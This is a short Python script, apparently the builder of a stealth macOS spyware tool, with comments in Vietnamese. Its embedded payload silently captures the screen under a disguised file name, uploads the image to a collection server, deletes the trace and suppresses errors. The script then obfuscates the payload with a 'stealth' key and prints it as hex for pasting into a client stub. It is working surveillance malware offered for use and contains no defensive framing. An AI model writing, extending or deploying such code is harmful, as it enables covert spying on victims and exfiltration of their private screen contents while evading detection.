from core.obfuscator import obfuscate_payload

SECRET_KEY = b"MACBOOK_STELTH_KEY_2025"
PAYLOAD = """
import os, subprocess, requests
try:
    temp_path = "/tmp/sys_cache_01.png"
    subprocess.run(["screencapture", "-x", temp_path])
    with open(temp_path, 'rb') as f:
        requests.post("http://127.0.0.1:5000/upload", files={'file': f})
    os.remove(temp_path)
except:
    pass
"""

if __name__ == "__main__":
    blob = obfuscate_payload(PAYLOAD, SECRET_KEY)
    print("-" * 30)
    print("HÃY COPY CHUỖI HEX DƯỚI ĐÂY (An toàn hơn chuỗi Byte):")
    print(blob.hex()) 
    print("-" * 30)

# file lấy mã hex này sẽ được dán vào client_stub.py